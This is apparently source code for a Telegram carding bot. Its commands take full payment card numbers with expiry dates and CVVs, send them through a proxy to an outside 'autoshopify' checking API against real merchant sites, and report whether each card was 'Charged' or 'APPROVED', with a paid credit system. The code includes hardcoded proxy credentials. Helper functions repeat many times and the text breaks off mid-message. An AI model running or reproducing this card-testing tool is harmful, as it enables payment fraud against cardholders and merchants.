        BULLET_GROUP_LINK = "https://t.me/+EwCcMzxhQ6Y3MTQ0"
        bullet_link = f'<a href="{BULLET_GROUP_LINK}">⩙</a>'

        # --- Initial processing message ---
        processing_text = (
            f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
            f"<pre><code>{escaped_card}</code></pre>\n\n"
            f"<b>Gateway ➵ 𝙎𝙩𝙧𝙞𝙥𝙚 𝟯$</b>\n"
        )

        processing_msg = await update.message.reply_text(
            processing_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

        # --- API request ---
        encoded_card = urllib.parse.quote_plus(full_card)
        encoded_site = urllib.parse.quote_plus(ST1_SITE)
        encoded_proxy = urllib.parse.quote_plus(ST1_PROXY)
        encoded_gateway = urllib.parse.quote_plus("stripe")

        api_url = (
        f"{AUTOSH_BASE}"
        f"?site={encoded_site}"
        f"&cc={encoded_card}"
        f"&proxy={encoded_proxy}"
    )

        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
                api_response = await resp.text()

        # --- Parse API response safely ---
        try:
            data = json.loads(api_response)
        except json.JSONDecodeError:
            logger.error(f"API returned invalid JSON: {api_response[:300]}")
            await processing_msg.edit_text(
                f"❌ Invalid API response:\n<code>{escape(api_response[:500])}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        response = data.get("Response", "Unknown")

        # --- BIN lookup safely ---
        try:
            bin_number = cc[:6]
            bin_details = await get_bin_info(bin_number)
            brand = (bin_details.get("scheme") or "N/A").title()
            issuer = bin_details.get("bank") or "N/A"
            country_name = bin_details.get("country") or "Unknown"
            country_flag = bin_details.get("country_emoji", "")
        except Exception as e:
            logger.warning(f"BIN lookup failed for {bin_number}: {e}")
            brand = issuer = "N/A"
            country_name = "Unknown"
            country_flag = ""

        # --- Requester and developer ---
        full_name = " ".join(filter(None, [user.first_name, user.last_name]))
        requester = f'<a href="tg://user?id={user.id}">{escape(full_name)}</a>'
        DEVELOPER_NAME = "𝘽𝙡𝙖𝙘𝙠𝙓𝘾𝙖𝙧𝙙 ⸙ ™"
        DEVELOPER_LINK = "tg://resolve?domain=BlinkCarder"
        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'

        # --- Determine header status + emojis ---
        display_response = escape(response)
        header_status = "❌ Declined"

        if re.search(r"\b(Thank You|ORDER_PLACED|approved|charged|success)\b", response, re.I):
            display_response += " ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
            header_status = "🔥 Charged"
        elif "3D_AUTHENTICATION" in response.upper():
            display_response += " 🔒"
            header_status = "✅ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿"
        elif any(x in response.upper() for x in ["INCORRECT_CVC", "INCORRECT_ZIP", "INSUFFICIENT_FUNDS"]):
            header_status = "✅ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿"
        elif "CARD_DECLINED" in response.upper():
            header_status = "❌ Declined"

        # --- Time elapsed ---
        elapsed_time = round(time.time() - start_time, 2)

        # --- Final formatted message ---
        final_text = (
            f"<b><i>{header_status}</i></b>\n\n"
            f"𝐂𝐚𝐫𝐝\n"
            f"⤷ <code>{escaped_card}</code>\n"
            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝙎𝙩𝙧𝙞𝙥𝙚 𝟯$\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{display_response}</code></i>\n\n"
            f"<pre>"
            f"𝐁𝐫𝐚𝐧𝐝 ➵ {escape(brand)}\n"
            f"𝐁𝐚𝐧𝐤 ➵ {escape(issuer)}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {escape(country_name)} {country_flag}"
            f"</pre>\n\n"
            f"𝐃𝐄𝐕 ➵ {developer_clickable}\n"
            f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
        )

        await processing_msg.edit_text(
            final_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

    except Exception as e:
        logger.exception("Error in processing /st1")
        try:
            if processing_msg:
                await processing_msg.edit_text(
                    f"❌ Error: <code>{escape(str(e))}</code>",
                    parse_mode=ParseMode.HTML
                )
            else:
                await update.message.reply_text(
                    f"❌ Error: <code>{escape(str(e))}</code>",
                    parse_mode=ParseMode.HTML
                )
        except Exception:
            pass

import aiohttp
import json
import logging
import asyncio
from datetime import datetime
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Import DB helpers
from db import get_user, update_user

logger = logging.getLogger(__name__)

# --- User cooldowns ---
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
    """Prevent spam by enforcing a cooldown per user."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False



# --- Shopify Processor ---
import asyncio
import aiohttp
import json
import logging
from html import escape
from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
import re

logger = logging.getLogger(__name__)

# --- HC Processor ---
async def process_oc(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    """
    Process a /oc command: check Ocean Payments charge, display response and BIN info.
    Gateway label = Ocean Payments, Price = 10$
    """
    import time
    start_time = time.time()
    processing_msg = None

    try:
        user = update.effective_user

        # --- Consume credit ---
        if not await consume_credit(user.id):
            await update.message.reply_text("❌ You don’t have enough credits left.")
            return

        # --- Extract card details ---
        parts = payload.split("|")
        if len(parts) != 4:
            await update.message.reply_text(
                "❌ Invalid format.\nUse: `/oc 1234567812345678|12|2028|123`",
                parse_mode=ParseMode.MARKDOWN_V2
            )
            return

        cc, mm, yy, cvv = [p.strip() for p in parts]
        full_card = f"{cc}|{mm}|{yy}|{cvv}"
        escaped_card = html.escape(full_card)

        # --- Clickable bullet ---
        BULLET_GROUP_LINK = "https://t.me/BlinkXChat"
        bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'

        # --- Initial processing message ---
        processing_text = (
            f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
            f"<pre><code>{escaped_card}</code></pre>\n\n"
            f"<b>Gateway ➵ 𝙊𝙘𝙚𝙖𝙣 𝙋𝙖𝙮𝙢𝙚𝙣𝙩𝙨 $10</b>\n"
        )

        processing_msg = await update.message.reply_text(
            processing_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

        # --- API request ---
        api_url = (
            f"https://autoshopify.stormx.pw/index.php"
            f"?site=https://decadastore.com"
            f"&cc={full_card}"
            f"&proxy=pl-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
        )

        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
                api_response = await resp.text()

        # --- Parse API response safely ---
        try:
            data = json.loads(api_response)
        except json.JSONDecodeError:
            logger.error(f"API returned invalid JSON: {api_response[:300]}")
            await processing_msg.edit_text(
                f"❌ Invalid API response:\n<code>{escape(api_response[:500])}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        response = data.get("Response", "Unknown")

        # --- BIN lookup safely ---
        try:
            bin_number = cc[:6]
            bin_details = await get_bin_info(bin_number)
            brand = (bin_details.get("scheme") or "N/A").title()
            issuer = bin_details.get("bank") or "N/A"
            country_name = bin_details.get("country") or "Unknown"
            country_flag = bin_details.get("country_emoji", "")
        except Exception as e:
            logger.warning(f"BIN lookup failed for {bin_number}: {e}")
            brand = issuer = "N/A"
            country_name = "Unknown"
            country_flag = ""

        # --- Requester and Developer ---
        full_name = " ".join(filter(None, [user.first_name, user.last_name]))
        requester = f'<a href="tg://user?id={user.id}">{escape(full_name)}</a>'
        DEVELOPER_NAME = "𝘽𝙡𝙖𝙘𝙠𝙓𝘾𝙖𝙧𝙙 ⸙ ™"
        DEVELOPER_LINK = "https://t.me/BlinkCarder"
        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'

        # --- Determine header status + emojis ---
        display_response = escape(response)
        header_status = "❌ Declined"

        if re.search(r"\b(Thank You|ORDER_PLACED|approved|charged|success)\b", response, re.I):
            display_response += " ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
            header_status = "🔥 Charged"
        elif "3D_AUTHENTICATION" in response.upper():
            display_response += " 🔒"
            header_status = "✅ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿"
        elif any(x in response.upper() for x in ["INCORRECT_CVC", "INSUFFICIENT_FUNDS", "INCORRECT_ZIP"]):
            header_status = "✅ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿"
        elif "CARD_DECLINED" in response.upper():
            header_status = "❌ Declined"

        # --- Time elapsed ---
        elapsed_time = round(time.time() - start_time, 2)

        # --- Final formatted message ---
        final_text = (
            f"<b><i>{header_status}</i></b>\n\n"
            f"𝐂𝐚𝐫𝐝\n"
            f"⤷ <code>{escaped_card}</code>\n"
            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝙊𝙘𝙚𝙖𝙣 𝙋𝙖𝙮𝙢𝙚𝙣𝙩𝙨 \n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{display_response}</code></i>\n\n"
            f"<pre>"
            f"𝐁𝐫𝐚𝐧𝐝 ➵ {escape(brand)}\n"
            f"𝐁𝐚𝐧𝐤 ➵ {escape(issuer)}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {escape(country_name)} {country_flag}"
            f"</pre>\n\n"
            f"𝐃𝐄𝐕 ➵ {developer_clickable}\n"
            f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
        )

        await processing_msg.edit_text(
            final_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

    except Exception as e:
        logger.exception("Error in processing /oc")
        try:
            if processing_msg:
                await processing_msg.edit_text(
                    f"❌ Error: <code>{escape(str(e))}</code>",
                    parse_mode=ParseMode.HTML
                )
            else:
                await update.message.reply_text(
                    f"❌ Error: <code>{escape(str(e))}</code>",
                    parse_mode=ParseMode.HTML
                )
        except Exception:
            pass





import re
import asyncio
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Flexible regex: supports |, /, :, or spaces as separators
OC_CARD_REGEX = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

async def oc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # --- Cooldown check ---
    if not await enforce_cooldown(user.id, update):
        return

    card_input = None

    # --- Check arguments first ---
    if context.args:
        raw_text = " ".join(context.args).strip()
        match = OC_CARD_REGEX.search(raw_text)
        if match:
            card_input = match.groups()

    # --- If no args, check reply message ---
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = OC_CARD_REGEX.search(update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    # --- If still no payload, show usage ---
    if not card_input:
        await update.message.reply_text(
            "⚠️ Usage: <code>/oc card|mm|yy|cvv</code>\n"
            "Or reply to a message containing a card.",
            parse_mode=ParseMode.HTML
        )
        return

    # --- Normalize format ---
    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)                      # Pad month → 2 digits
    yy = yy[-2:] if len(yy) == 4 else yy  # Convert YYYY → YY
    payload = f"{card}|{mm}|{yy}|{cvv}"

    # --- Run in background ---
    asyncio.create_task(process_oc(update, context, payload))






import aiohttp
import json
import logging
import asyncio
from datetime import datetime
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
import re

# Import DB helpers
from db import get_user, update_user

logger = logging.getLogger(__name__)

# --- User cooldowns ---
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
    """Prevent spam by enforcing a cooldown per user."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False


import re
import asyncio
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Flexible regex: supports |, /, :, or spaces as separators
ST1_CARD_REGEX = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

async def st1_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # --- Cooldown check ---
    if not await enforce_cooldown(user.id, update):
        return

    card_input = None

    # --- Check arguments ---
    if context.args:
        raw_text = " ".join(context.args).strip()
        match = ST1_CARD_REGEX.search(raw_text)
        if match:
            card_input = match.groups()

    # --- If no args, check reply message ---
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = ST1_CARD_REGEX.search(update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    # --- If still no payload ---
    if not card_input:
        await update.message.reply_text(
            "⚠️ Usage: <code>/st1 card|mm|yy|cvv</code>\n"
            "Or reply to a message containing a card.",
            parse_mode=ParseMode.HTML
        )
        return

    # --- Normalize ---
    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)                      # Pad month → 2 digits
    yy = yy[-2:] if len(yy) == 4 else yy  # Reduce YYYY → YY
    payload = f"{card}|{mm}|{yy}|{cvv}"

    # --- Run in background ---
    asyncio.create_task(process_st1(update, context, payload))


import aiohttp
import json
import logging
import asyncio
from datetime import datetime
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Import DB helpers
from db import get_user, update_user

logger = logging.getLogger(__name__)

# --- User cooldowns ---
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
    """Prevent spam by enforcing a cooldown per user."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False



# --- Shopify Processor ---
import asyncio
import aiohttp
import json
import logging
from html import escape
from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
import re

import aiohttp
import json
import logging
import asyncio
from datetime import datetime
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
import re

# Import DB helpers
from db import get_user, update_user

logger = logging.getLogger(__name__)

# --- User cooldowns ---
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
    """Prevent spam by enforcing a cooldown per user."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False

# --- HC Processor ---
import aiohttp
import json
import re
import logging
import urllib.parse
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from db import get_user, update_user
from bin import get_bin_info

logger = logging.getLogger(__name__)

# --- Config ---
AUTOSH_BASE = "https://autoshopify.stormx.pw/index.php"
DEFAULT_PROXY = "pl-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
AUTHNET_DEFAULT_SITE = "https://upperlimitsupplements.com"

async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    """
    Process a /at command: check AuthNet card, display response and BIN info.
    Gateway label = AuthNet, Price = 1$
    """
    import time
    start_time = time.time()
    processing_msg = None

    try:
        user = update.effective_user

        # --- Consume credit ---
        if not await consume_credit(user.id):
            await update.message.reply_text("❌ You don't have enough credits left.")
            return

        # --- Extract card details ---
        parts = payload.split("|")
        if len(parts) != 4:
            await update.message.reply_text(
                "❌ Invalid format.\nUse: /at 1234567812345678|12|2028|123",
                parse_mode=ParseMode.MARKDOWN_V2
            )
            return

        cc, mm, yy, cvv = [p.strip() for p in parts]
        full_card = f"{cc}|{mm}|{yy}|{cvv}"
        escaped_card = escape(full_card)

        # --- Clickable bullet ---
        BULLET_GROUP_LINK = "https://t.me/+EwCcMzxhQ6Y3MTQ0"
        bullet_link = f'<a href="{BULLET_GROUP_LINK}">⩙</a>'

        # --- Initial processing message ---
        processing_text = (
            f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
            f"<pre><code>{escaped_card}</code></pre>\n\n"
            f"<b>Gateway ➵ 𝘼𝘂𝘁𝘩𝙉𝙚𝙩 𝟭$</b>\n"
        )

        processing_msg = await update.message.reply_text(
            processing_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

        # --- API request ---
        # URL encode the parameters
        encoded_card = urllib.parse.quote_plus(full_card)
        encoded_site = urllib.parse.quote_plus(AUTHNET_DEFAULT_SITE)
        encoded_proxy = urllib.parse.quote_plus(DEFAULT_PROXY)
        
        api_url = (
        f"{AUTOSH_BASE}"
        f"?site={encoded_site}"
        f"&cc={encoded_card}"
        f"&proxy={encoded_proxy}"
    )

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
                    api_response = await resp.text()
        except asyncio.TimeoutError:
            await processing_msg.edit_text("❌ Error: API request timed out.", parse_mode=ParseMode.HTML)
            return
        except Exception as e:
            await processing_msg.edit_text(
                f"❌ API request failed: <code>{escape(str(e))}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        # --- Parse API response safely ---
        try:
            data = json.loads(api_response)
        except json.JSONDecodeError:
            logger.error(f"API returned invalid JSON: {api_response[:300]}")
            await processing_msg.edit_text(
                f"❌ Invalid API response:\n<code>{escape(api_response[:500])}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        response = data.get("Response", "Unknown")

        # --- BIN lookup safely ---
        try:
            bin_number = cc[:6]
            bin_details = await get_bin_info(bin_number)
            brand = (bin_details.get("scheme") or "N/A").title()
            issuer = bin_details.get("bank") or "N/A"
            country_name = bin_details.get("country") or "Unknown"
            country_flag = bin_details.get("country_emoji", "")
        except Exception as e:
            logger.warning(f"BIN lookup failed for {bin_number}: {e}")
            brand = issuer = "N/A"
            country_name = "Unknown"
            country_flag = ""

        # --- Requester and Developer ---
        full_name = " ".join(filter(None, [user.first_name, user.last_name]))
        requester = f'<a href="tg://user?id={user.id}">{escape(full_name)}</a>'
        DEVELOPER_NAME = "𝘽𝙡𝙖𝙘𝙠𝙓𝘾𝙖𝙧𝙙 ⸙ ™"
        DEVELOPER_LINK = "tg://resolve?domain=BlinkCarder"
        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'

        # --- Determine header status + emojis ---
        display_response = escape(response)
        header_status = "❌ Declined"

        if re.search(r"\b(Thank You|ORDER_PLACED|approved|charged|success)\b", response, re.I):
            display_response += " ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
            header_status = "🔥 Charged"
        elif "3D_AUTHENTICATION" in response.upper():
            display_response += " 🔒"
            header_status = "✅ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿"
        elif any(x in response.upper() for x in ["INCORRECT_CVC", "INSUFFICIENT_FUNDS", "INCORRECT_ZIP"]):
            header_status = "✅ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿"
        elif "CARD_DECLINED" in response.upper():
            header_status = "❌ Declined"

        # --- Time elapsed ---
        elapsed_time = round(time.time() - start_time, 2)

        # --- Final formatted message ---
        final_text = (
            f"<b><i>{header_status}</i></b>\n\n"
            f"𝐂𝐚𝐫𝐝\n"
            f"⤷ <code>{escaped_card}</code>\n"
            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝘼𝘂𝘁𝘩𝙉𝙚𝙩 𝟭$\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{display_response}</code></i>\n\n"
            f"<pre>"
            f"𝐁𝐫𝐚𝐧𝐝 ➵ {escape(brand)}\n"
            f"𝐁𝐚𝐧𝐤 ➵ {escape(issuer)}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {escape(country_name)} {country_flag}"
            f"</pre>\n\n"
            f"𝐃𝐄𝐕 ➵ {developer_clickable}\n"
            f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
        )

        await processing_msg.edit_text(
            final_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

    except Exception as e:
        logger.exception("Error in processing /at")
        try:
            if processing_msg:
                await processing_msg.edit_text(
                    f"❌ Error: <code>{escape(str(e))}</code>",
                    parse_mode=ParseMode.HTML
                )
            else:
                await update.message.reply_text(
                    f"❌ Error: <code>{escape(str(e))}</code>",
                    parse_mode=ParseMode.HTML
                )
        except Exception:
            pass

# --- Main /at command ---
import re
import asyncio
from telegram.constants import ParseMode

# Flexible regex: supports |, /, :, or spaces as separators
AT_CARD_REGEX = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

async def at_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # --- Cooldown check ---
    if not await enforce_cooldown(user.id, update):
        return

    card_input = None

    # --- Check arguments first ---
    if context.args:
        raw_text = " ".join(context.args).strip()
        match = AT_CARD_REGEX.search(raw_text)
        if match:
            card_input = match.groups()

    # --- If no args, check reply message ---
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = AT_CARD_REGEX.search(update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    # --- If still no payload ---
    if not card_input:
        await update.message.reply_text(
            "⚠️ Usage: <code>/at card|mm|yy|cvv</code>\n"
            "Or reply to a message containing a card.",
            parse_mode=ParseMode.HTML
        )
        return

    # --- Normalize format ---
    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)                      # Pad month → 2 digits
    yy = yy[-2:] if len(yy) == 4 else yy  # Convert YYYY → YY
    payload = f"{card}|{mm}|{yy}|{cvv}"

    # --- Run in background ---
    asyncio.create_task(process_at(update, context, payload))





import aiohttp
import json
import logging
import asyncio
from datetime import datetime
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
import re

# Import DB helpers
from db import get_user, update_user

logger = logging.getLogger(__name__)

# --- User cooldowns ---
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
    """Prevent spam by enforcing a cooldown per user."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False

# --- HC Processor ---
import aiohttp
import json
import re
import logging
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from db import get_user, update_user
from bin import get_bin_info

logger = logging.getLogger(__name__)

# --- Config ---
AUTOSH_AT_API = "https://autoshopify.stormx.pw/index.php"
DEFAULT_PROXY = "pl-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
AUTHNET_DEFAULT_SITE = "https://store.wikimedia.org"


async def process_py(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    """
    Process a /pp command: check PayPal-like gateway, display response and BIN info.
    Gateway label = PayPal, Price = 9$
    """
    import time
    start_time = time.time()
    processing_msg = None

    try:
        user = update.effective_user

        # --- Consume credit ---
        if not await consume_credit(user.id):
            await update.message.reply_text("❌ You don’t have enough credits left.")
            return

        # --- Extract card details ---
        parts = payload.split("|")
        if len(parts) != 4:
            await update.message.reply_text(
                "❌ Invalid format.\nUse: /pp 1234567812345678|12|2028|123",
                parse_mode=ParseMode.MARKDOWN_V2
            )
            return

        cc, mm, yy, cvv = [p.strip() for p in parts]
        full_card = f"{cc}|{mm}|{yy}|{cvv}"
        escaped_card = html.escape(full_card)

        # --- Clickable bullet ---
        BULLET_GROUP_LINK = "https://t.me/+EwCcMzxhQ6Y3MTQ0"
        bullet_link = f'<a href="{BULLET_GROUP_LINK}">⩙</a>'

        # --- Initial processing message ---
        processing_text = (
            f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
            f"<pre><code>{escaped_card}</code></pre>\n\n"
            f"<b>Gateway ➵ 𝙋𝙖𝙮𝙋𝙖𝙡 𝟵$</b>\n"
        )

        processing_msg = await update.message.reply_text(
            processing_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

        # --- API request ---
        api_url = (
            f"{AUTOSH_AT_API}"
            f"?site={AUTHNET_DEFAULT_SITE}"
            f"&cc={full_card}"
            f"&proxy={DEFAULT_PROXY}"
        )

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
                    api_response = await resp.text()
        except asyncio.TimeoutError:
            await processing_msg.edit_text("❌ Error: API request timed out.", parse_mode=ParseMode.HTML)
            return
        except Exception as e:
            await processing_msg.edit_text(
                f"❌ API request failed: <code>{escape(str(e))}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        # --- Parse API response safely ---
        try:
            data = json.loads(api_response)
        except json.JSONDecodeError:
            logger.error(f"API returned invalid JSON: {api_response[:300]}")
            await processing_msg.edit_text(
                f"❌ Invalid API response:\n<code>{escape(api_response[:500])}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        response = data.get("Response", "Unknown")
        gateway = "PayPal"
        price = "9$"

        # --- BIN lookup safely ---
        try:
            bin_number = cc[:6]
            bin_details = await get_bin_info(bin_number)
            brand = (bin_details.get("scheme") or "N/A").title()
            issuer = bin_details.get("bank") or "N/A"
            country_name = bin_details.get("country") or "Unknown"
            country_flag = bin_details.get("country_emoji", "")
        except Exception as e:
            logger.warning(f"BIN lookup failed for {bin_number}: {e}")
            brand = issuer = "N/A"
            country_name = "Unknown"
            country_flag = ""

        # --- Requester and Developer ---
        full_name = " ".join(filter(None, [user.first_name, user.last_name]))
        requester = f'<a href="tg://user?id={user.id}">{escape(full_name)}</a>'
        DEVELOPER_NAME = "𝘽𝙡𝙖𝙘𝙠𝙓𝘾𝙖𝙧𝙙 ⸙ ™"
        DEVELOPER_LINK = "tg://resolve?domain=BlinkCarder"
        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'

        # --- Determine header status + emojis ---
        display_response = escape(response)
        header_status = "❌ Declined"

        if re.search(r"\b(Thank You|ORDER_PLACED|approved|charged|success)\b", response, re.I):
            display_response += " ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
            header_status = "🔥 Charged"
        elif "3D_AUTHENTICATION" in response.upper():
            display_response += " 🔒"
            header_status = "✅ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿"
        elif any(x in response.upper() for x in ["INCORRECT_CVC", "INSUFFICIENT_FUNDS", "INCORRECT_ZIP"]):
            header_status = "✅ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿"
        elif "CARD_DECLINED" in response.upper():
            header_status = "❌ Declined"

        # --- Time elapsed ---
        import time
        elapsed_time = round(time.time() - start_time, 2)

        # --- Final formatted message ---
        final_text = (
            f"<b><i>{header_status}</i></b>\n\n"
            f"𝐂𝐚𝐫𝐝\n"
            f"⤷ <code>{escaped_card}</code>\n"
            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝙋𝙖𝙮𝙋𝙖𝙡 𝟵$\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{display_response}</code></i>\n\n"
            f"<pre>"
            f"𝐁𝐫𝐚𝐧𝐝 ➵ {escape(brand)}\n"
